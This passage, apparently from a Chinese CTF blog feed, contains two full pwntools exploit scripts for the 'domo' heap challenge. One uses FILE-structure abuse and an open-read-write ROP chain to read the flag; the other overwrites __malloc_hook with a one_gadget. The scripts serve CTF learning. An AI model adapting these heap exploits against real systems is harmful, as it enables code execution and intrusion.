class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">pwn_name = <span class="string">"domo"</span></span><br><span class="line">arch = <span class="string">'64'</span></span><br><span class="line">version = <span class="string">'2.23'</span></span><br><span class="line">ip, port = <span class="string">'node3.buuoj.cn'</span>, <span class="number">29246</span></span><br><span class="line"><span class="comment">#context.terminal = ['tmux', 'splitw', '-h']</span></span><br><span class="line">context(os=<span class="string">'linux'</span>, arch=<span class="string">'amd64'</span>)</span><br><span class="line"><span class="keyword">if</span> sys.argv[<span class="number">1</span>]==<span class="string">"l"</span>:</span><br><span class="line">p=process(<span class="string">'./'</span>+pwn_name)</span><br><span class="line">libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>,checksec=<span class="keyword">False</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p=remote(ip,port)</span><br><span class="line">libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>,checksec=<span class="keyword">False</span>)</span><br><span class="line"></span><br><span class="line">elf=ELF(pwn_name,checksec=<span class="keyword">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_one</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span>(arch == <span class="string">'64'</span>):</span><br><span class="line">        <span class="keyword">if</span>(version == <span class="string">'2.23'</span>):</span><br><span class="line">            one = [<span class="number">0x45216</span>, <span class="number">0x4526a</span>, <span class="number">0xf02a4</span>, <span class="number">0xf1147</span>]</span><br><span class="line">        <span class="keyword">if</span> (version == <span class="string">'2.27'</span>):</span><br><span class="line">            one = [<span class="number">0x4f2c5</span> , <span class="number">0x4f322</span> , <span class="number">0x10a38c</span>]</span><br><span class="line">    <span class="keyword">return</span> one</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">info</span><span class="params">(con,leak)</span>:</span></span><br><span class="line">    success(<span class="string">'&#123;&#125; =&gt; &#123;:#x&#125;'</span>.format(con,leak))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span><span class="params">(address=<span class="number">0</span>)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> address==<span class="number">0</span>:</span><br><span class="line">        gdb.attach(p)</span><br><span class="line">        pause()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> address &gt; <span class="number">0xfffff</span>:</span><br><span class="line">            script=<span class="string">"b *&#123;:#x&#125;\nc\n"</span>.format(address)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            script=<span class="string">"b *$rebase(&#123;:#x&#125;)\nc\n"</span>.format(address)</span><br><span class="line">        gdb.attach(p, script)</span><br><span class="line"></span><br><span class="line">one = get_one()</span><br><span class="line"></span><br><span class="line"><span class="comment">#---------------heap-------------</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">chioce</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"&gt; "</span>,str(idx))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,data)</span>:</span></span><br><span class="line">    chioce(<span class="number">1</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"\n"</span>,str(size))</span><br><span class="line">    p.sendafter(<span class="string">"\n"</span>,data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add2</span><span class="params">(size,data)</span>:</span></span><br><span class="line">    chioce(<span class="number">1</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">":"</span>,str(size))</span><br><span class="line">    p.sendafter(<span class="string">":"</span>,data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(index)</span>:</span></span><br><span class="line">    chioce(<span class="number">2</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"\n"</span>,str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free2</span><span class="params">(index)</span>:</span></span><br><span class="line">    chioce(<span class="number">2</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">":"</span>,str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index, data)</span>:</span></span><br><span class="line">    chioce(<span class="number">4</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">":"</span>,str(index))</span><br><span class="line">    p.sendafter(<span class="string">":"</span>,data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(index)</span>:</span></span><br><span class="line">    chioce(<span class="number">3</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'\n'</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line"></span><br><span class="line"><span class="comment">#-----------leak heap----------------</span></span><br><span class="line">add(<span class="number">0x18</span>, <span class="string">"A"</span>) <span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x18</span>, <span class="string">"A"</span>) <span class="comment">#1</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x18</span>, <span class="string">"\x10"</span>) <span class="comment">#0</span></span><br><span class="line">show(<span class="number">0</span>) </span><br><span class="line">heap_addr=u64 (p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">"\x00"</span>))</span><br><span class="line">info(<span class="string">"heap_addr"</span>,heap_addr)</span><br><span class="line">free (<span class="number">0</span>) </span><br><span class="line"></span><br><span class="line"><span class="comment">#------------------leak libc----------------</span></span><br><span class="line">add(<span class="number">0x100</span>, <span class="string">"A"</span>* <span class="number">0x100</span>) <span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x100</span>, <span class="string">'b'</span>* <span class="number">0x100</span>) <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x68</span>, <span class="string">'c'</span> *<span class="number">0x68</span>)   <span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x68</span>, <span class="string">'d'</span> *<span class="number">0x68</span>)<span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x100</span>, <span class="string">'e'</span>*<span class="number">56</span>+p64(<span class="number">0x71</span>)+<span class="string">'e'</span>*<span class="number">176</span>+ p64(<span class="number">0x100</span>) +p64(<span class="number">0x21</span>))<span class="comment">#4</span></span><br><span class="line">add(<span class="number">0x68</span>,p64 (<span class="number">0x21</span>) *<span class="number">2</span>)<span class="comment">#5</span></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">"\x11"</span>*<span class="number">0x60</span>+p64(<span class="number">0x300</span>)) <span class="comment">#3</span></span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">'flag'</span>.ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)+<span class="string">'\x22'</span>*<span class="number">0x58</span>) <span class="comment">#0</span></span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">main_arena=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">"\x00"</span>))</span><br><span class="line">libc.address=main_arena<span class="number">-0x3c4b78</span></span><br><span class="line">environ_addr=libc.symbols[<span class="string">"environ"</span>]</span><br><span class="line">stdout_hook=libc.symbols[<span class="string">"_IO_2_1_stdout_"</span>]</span><br><span class="line">stdin_hook=libc.symbols[<span class="string">"_IO_2_1_stdin_"</span>]</span><br><span class="line">_IO_file_jumps=libc.symbols[<span class="string">"_IO_file_jumps"</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#-----------leak stack_addr--------------</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">"A"</span>*<span class="number">0x100</span></span><br><span class="line">payload += p64(<span class="number">0</span>) + p64(<span class="number">0x71</span>)</span><br><span class="line">payload+=p64(stdout_hook<span class="number">-0x43</span>)</span><br><span class="line">add(<span class="number">0x118</span>,payload) <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'a'</span>) <span class="comment">#2</span></span><br><span class="line"></span><br><span class="line">payload=p64(<span class="number">0</span>)*<span class="number">5</span>+<span class="string">'\x00'</span>*<span class="number">3</span>+p64(_IO_file_jumps)+p64(<span class="number">0xfbad1800</span>)+p64(stdout_hook+<span class="number">131</span>)*<span class="number">3</span></span><br><span class="line">payload+=p64(environ_addr)+p64(environ_addr+<span class="number">8</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"len="</span>,hex(len(payload))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x68</span>,payload) <span class="comment">#6</span></span><br><span class="line">stack_addr=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))<span class="number">-0xf2</span></span><br><span class="line">info(<span class="string">"stack_addr"</span>,stack_addr)</span><br><span class="line"></span><br><span class="line"><span class="comment">#--------Write orw to stack----------</span></span><br><span class="line"></span><br><span class="line">add2(<span class="number">0xf8</span>,p64(<span class="number">0</span>)*<span class="number">11</span>+p64(<span class="number">0x71</span>)) <span class="comment">#4</span></span><br><span class="line">free2(<span class="number">0</span>)</span><br><span class="line">free2(<span class="number">4</span>)</span><br><span class="line">add2(<span class="number">0x68</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x111</span>)) <span class="comment">#7</span></span><br><span class="line">free2(<span class="number">7</span>)</span><br><span class="line">add2(<span class="number">0x108</span>,p64(<span class="number">0</span>)*<span class="number">11</span>+p64(<span class="number">0x71</span>)+p64(stdin_hook<span class="number">-0x28</span>))</span><br><span class="line">add2(<span class="number">0x68</span>,<span class="string">'flag'</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi_ret=libc.search(asm(<span class="string">"pop rdi\nret"</span>)).next()</span><br><span class="line">pop_rsi_ret=libc.search(asm(<span class="string">"pop rsi\nret"</span>)).next()</span><br><span class="line">pop_rdx_ret=libc.search(asm(<span class="string">"pop rdx\nret"</span>)).next()</span><br><span class="line"></span><br><span class="line">open_addr=libc.symbols[<span class="string">"open"</span>]</span><br><span class="line">read_addr=libc.symbols[<span class="string">"read"</span>]</span><br><span class="line">puts_addr=libc.symbols[<span class="string">"write"</span>]</span><br><span class="line"></span><br><span class="line">orw=p64(pop_rdi_ret)+p64(heap_addr+<span class="number">0x50</span>)+p64(pop_rsi_ret)+p64(<span class="number">72</span>)+p64(open_addr)</span><br><span class="line">orw+=p64(pop_rdi_ret)+p64(<span class="number">3</span>)+p64(pop_rsi_ret)+p64(heap_addr+<span class="number">0x12a8</span>)+p64(pop_rdx_ret)+p64(<span class="number">0x30</span>)+p64(read_addr)</span><br><span class="line">orw+=p64(pop_rdi_ret)+p64(<span class="number">1</span>)+p64(pop_rsi_ret)+p64(heap_addr+<span class="number">0x12a8</span>)+p64(pop_rdx_ret)+p64(<span class="number">0x100</span>)+p64(puts_addr)</span><br><span class="line"></span><br><span class="line">payload=p64(<span class="number">0</span>)+p64(libc.symbols[<span class="string">"_IO_file_jumps"</span>])+p64(<span class="number">0</span>)+ p64(<span class="number">0xfbad1800</span>)+p64(<span class="number">0</span>)*<span class="number">6</span>+p64(stack_addr)+p64(stack_addr+<span class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line">info(<span class="string">"heap_addr"</span>,heap_addr)</span><br><span class="line">info(<span class="string">"stack_addr"</span>,stack_addr)</span><br><span class="line"></span><br><span class="line">edit(stdin_hook<span class="number">-0x20</span>,<span class="string">'\x7f'</span>)</span><br><span class="line">add2(<span class="number">0x68</span>,payload)</span><br><span class="line"><span class="comment">#dbg()</span></span><br><span class="line">p.sendlineafter(<span class="string">"&gt; "</span>,<span class="string">"5\n"</span>+orw)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="exp3"><a href="#exp3" class="headerlink" title="exp3"></a>exp3</h3><p>还有另一种非预期思路，打<code>malloc_hook</code>,然后利用<code>scanf</code>函数输入过多字符，会调用<code>malloc</code>申请内存</p><p>这里<code>onegadget</code>都失效了，用<code>realloc</code>调整偏移即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">pwn_name = <span class="string">"domo"</span></span><br><span class="line">arch = <span class="string">'64'</span></span><br><span class="line">version = <span class="string">'2.23'</span></span><br><span class="line">ip, port = <span class="string">'node3.buuoj.cn'</span>,<span class="number">29246</span></span><br><span class="line"><span class="comment">#context.terminal = ['tmux', 'splitw', '-h']</span></span><br><span class="line"><span class="comment">#context(os='linux', arch='amd64')</span></span><br><span class="line"><span class="keyword">if</span> sys.argv[<span class="number">1</span>]==<span class="string">"l"</span>:</span><br><span class="line">p=process(<span class="string">'./'</span>+pwn_name)</span><br><span class="line">libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>,checksec=<span class="keyword">False</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p=remote(ip,port)</span><br><span class="line">libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>,checksec=<span class="keyword">False</span>)</span><br><span class="line"></span><br><span class="line">elf=ELF(pwn_name,checksec=<span class="keyword">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_one</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span>(arch == <span class="string">'64'</span>):</span><br><span class="line">        <span class="keyword">if</span>(version == <span class="string">'2.23'</span>):</span><br><span class="line">            one = [<span class="number">0x45216</span>, <span class="number">0x4526a</span>, <span class="number">0xf02a4</span>, <span class="number">0xf1147</span>]</span><br><span class="line">        <span class="keyword">if</span> (version == <span class="string">'2.27'</span>):</span><br><span class="line">            one = [<span class="number">0x4f2c5</span> , <span class="number">0x4f322</span> , <span class="number">0x10a38c</span>]</span><br><span class="line">    <span class="keyword">return</span> one</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sym</span><span class="params">(func)</span>:</span></span><br><span class="line">    success(<span class="string">'&#123;&#125; =&gt; &#123;:#x&#125;'</span>.format(func , libc.sym[func]))</span><br><span class="line">    <span class="keyword">return</span> libc.sym[func]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">info</span><span class="params">(con,leak)</span>:</span></span><br><span class="line">    success(<span class="string">'&#123;&#125; =&gt; &#123;:#x&#125;'</span>.format(con,leak))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span><span class="params">(address=<span class="number">0</span>)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> address==<span class="number">0</span>:</span><br><span class="line">        gdb.attach(p)</span><br><span class="line">        pause()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> address &gt; <span class="number">0xfffff</span>:</span><br><span class="line">            script=<span class="string">"b *&#123;:#x&#125;\nc\n"</span>.format(address)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            script=<span class="string">"b *$rebase(&#123;:#x&#125;)\nc\n"</span>.format(address)</span><br><span class="line">        gdb.attach(p, script)</span><br><span class="line"></span><br><span class="line">one = get_one()</span><br><span class="line"></span><br><span class="line"><span class="comment">#---------------heap-------------</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">chioce</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"&gt; "</span>,str(idx))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,data)</span>:</span></span><br><span class="line">    chioce(<span class="number">1</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"\n"</span>,str(size))</span><br><span class="line">    p.sendafter(<span class="string">"\n"</span>,data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(index)</span>:</span></span><br><span class="line">    chioce(<span class="number">2</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"\n"</span>,str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index, data)</span>:</span></span><br><span class="line">    chioce(<span class="number">4</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"\n"</span>,str(index))</span><br><span class="line">    p.sendafter(<span class="string">"\n"</span>,data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(index)</span>:</span></span><br><span class="line">    chioce(<span class="number">3</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'\n'</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">'\x12'</span>*<span class="number">8</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'\x13'</span>*<span class="number">0x60</span> + p64(<span class="number">0x110</span> + <span class="number">0x70</span>))<span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x110</span>,p64(<span class="number">0x21</span>)*<span class="number">32</span>)<span class="comment">#2</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x90</span>,<span class="string">'\x15'</span>*<span class="number">8</span>)<span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">"\x16"</span>*<span class="number">0x60</span> + p64(<span class="number">0x110</span> + <span class="number">0x70</span>))<span class="comment">#4</span></span><br><span class="line">add(<span class="number">0x110</span>,p64(<span class="number">0x21</span>)*<span class="number">32</span>)<span class="comment">#5</span></span><br><span class="line"><span class="comment">#---------------leak libc heap addr--------------------</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">"a"</span>*<span class="number">8</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x90</span>,<span class="string">'\x15'</span>*<span class="number">8</span>)<span class="comment">#3</span></span><br><span class="line"></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">leak=u64(p.recvuntil(<span class="string">'\x0a'</span>)[<span class="number">-7</span>:<span class="number">-1</span>].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">heap=leak<span class="number">-0x55b3d7aa52b0</span>+<span class="number">0x55b3d7aa5010</span></span><br><span class="line">info(<span class="string">"leak"</span>,leak)</span><br><span class="line">info(<span class="string">"heap"</span>,heap)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">show(<span class="number">3</span>)</span><br><span class="line">leak=u64(p.recvuntil(<span class="string">'\x7f'</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">libc.address=leak<span class="number">-0x7f2534dafb78</span>+<span class="number">0x7f25349eb000</span></span><br><span class="line"></span><br><span class="line">info(<span class="string">"leak"</span>,leak)</span><br><span class="line">info(<span class="string">"libc"</span>,libc.address)</span><br><span class="line"></span><br><span class="line"><span class="comment">#------------------- unlink-------------</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'\x13'</span>*<span class="number">0x60</span> + p64(<span class="number">0x110</span> + <span class="number">0x70</span>))<span class="comment">#1</span></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#------------------fastbin attack + malloc_hook-------</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x120</span>,<span class="string">'\x12'</span>*<span class="number">0x100</span>+p64(<span class="number">0x110</span>)+p64(<span class="number">0x70</span>)+p64(libc.sym[<span class="string">'__malloc_hook'</span>]<span class="number">-0x23</span>)) <span class="comment">#1</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">"\x17"</span>*<span class="number">8</span>) <span class="comment">#</span></span><br><span class="line">malloc_hook_payload2=<span class="string">'b'</span>*<span class="number">0xb</span>+p64(one[<span class="number">2</span>]+libc.address)+p64(sym(<span class="string">"realloc"</span>)+<span class="number">13</span>)</span><br><span class="line">add(<span class="number">0x60</span>,malloc_hook_payload2) <span class="comment">#2</span></span><br><span class="line"><span class="comment">#dbg(0x12D7)</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">"&gt; "</span>,<span class="string">'0'</span>*<span class="number">0x100</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;domo&quot;&gt;&lt;a href=&quot;#domo&quot; class=&quot;headerlink&quot; title=&quot;domo&quot;&gt;&lt;/a&gt;domo&lt;/h2&gt;&lt;p&gt;一道 domo日了一天，最后还是做出来，还是很高兴的&lt;/p&gt;
&lt;p&gt;&lt;code&gt;off-by-null&lt;/code&gt;漏洞，e
      
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>gcc编译器和clang编译器的对比分析</title>
    <link href="https://nocbtm.github.io/2020/05/11/gcc%E7%BC%96%E8%AF%91%E5%99%A8%E5%92%8Cclang%E7%BC%96%E8%AF%91%E5%99%A8%E7%9A%84%E5%AF%B9%E6%AF%94%E5%88%86%E6%9E%90/"/>
    <id>https://nocbtm.github.io/2020/05/11/gcc编译器和clang编译器的对比分析/</id>
    <published>2020-05-11T13:36:10.000Z</published>
    <updated>2020-09-01T10:49:40.807Z</updated>
    
    <content type="html"><![CDATA[<p>咕咕咕，留个坑。等有时间再写</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;咕咕咕，留个坑。等有时间再写&lt;/p&gt;

      
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>一种新的动态链接方式</title>
    <link href="https://nocbtm.github.io/2020/05/08/%E4%B8%80%E7%A7%8D%E6%96%B0%E7%9A%84%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E6%96%B9%E5%BC%8F/"/>
    <id>https://nocbtm.github.io/2020/05/08/一种新的动态链接方式/</id>
    <published>2020-05-08T04:20:22.000Z</published>
    <updated>2020-05-11T14:02:11.521Z</updated>
    
    <content type="html"><![CDATA[<script src="/crypto-js.js"></script><script src="/mcommon.js"></script><h3 id="encrypt-message">该文章被加密了，请联系管理员请求密码.</h3><link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap.min.css"> <link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap-theme.min.css"> <script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script> <script src="//cdn.bootcss.com/bootstrap/3.3.5/js/bootstrap.min.js"></script> <div id="security"> <div> <div class="input-group"> <input type="text" class="form-control" aria-label="Enter the password." id="pass"/> <div class="input-group-btn"> <button type="button" class="btn btn-default" onclick="decryptAES()">Decrypt</button> </div> </div> </div> </div> <div id="encrypt-blog" style="display:none"> U2FsdGVkX18uPOL5N3aDagIoC/rsoKEnd93b/TXFnOA= </div>]]></content>
    
    <summary type="html">
    
      The article has been encrypted, please enter your password to view.&lt;br&gt;
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>对hello world的重新认识</title>
    <link href="https://nocbtm.github.io/2020/05/08/%E5%AF%B9hello-world%E7%9A%84%E9%87%8D%E6%96%B0%E8%AE%A4%E8%AF%86/"/>
    <id>https://nocbtm.github.io/2020/05/08/对hello-world的重新认识/</id>
    <published>2020-05-08T02:07:19.000Z</published>
    <updated>2020-05-25T03:32:08.776Z</updated>
    
